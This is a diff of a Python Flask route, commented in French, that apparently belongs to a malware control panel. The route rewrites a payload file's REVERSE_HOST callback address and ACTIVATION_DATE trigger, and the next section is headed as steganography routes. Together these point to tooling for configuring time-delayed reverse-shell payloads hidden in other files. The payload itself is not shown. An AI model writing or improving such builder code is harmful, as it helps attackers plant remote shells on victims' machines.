@@ -493,29 +493,35 @@ def set_payload_config():
     """Met à jour la configuration du payload."""
     data = request.get_json()
     new_host = data.get('host')
-    new_date = data.get('date') # Format YYYY-MM-DD
+    new_date_str = data.get('date') # Format YYYY-MM-DD
 
-    if not new_host or not new_date:
+    if not new_host or not new_date_str:
         return jsonify({'error': 'Les données fournies sont incomplètes.'}), 400
 
     try:
-        year, month, day = map(int, new_date.split('-'))
+        year, month, day = map(int, new_date_str.split('-'))
         
         with open(PAYLOAD_FILE, 'r', encoding='utf-8') as f:
-            content = f.read()
+            lines = f.readlines()
 
-        # Remplacer l\'IP de manière robuste
-        content = re.sub(r"(REVERSE_HOST\s*=\s*')([^']*)(')", rf"\1{new_host}\3", content)
-        # Remplacer la date de manière robuste
-        content = re.sub(r"(ACTIVATION_DATE\s*=\s*datetime\.date\()([^)]*)(\))", rf"\1{year}, {month}, {day}\3", content)
+        new_lines = []
+        for line in lines:
+            if line.strip().startswith('REVERSE_HOST'):
+                new_lines.append(f"REVERSE_HOST = '{new_host}'\n")
+            elif line.strip().startswith('ACTIVATION_DATE'):
+                new_lines.append(f"ACTIVATION_DATE = datetime.date({year}, {month}, {day})\n")
+            else:
+                new_lines.append(line)
 
         with open(PAYLOAD_FILE, 'w', encoding='utf-8') as f:
-            f.write(content)
+            f.writelines(new_lines)
             
         return jsonify({'message': 'Configuration du payload mise à jour avec succès.'})
 
     except Exception as e:
+        app.logger.error(f"Erreur lors de la mise à jour du payload: {e}", exc_info=True)
         return jsonify({'error': str(e)}), 500
+
 
 # --- ROUTES POUR LA STÉGANOGRAPHIE ---
 
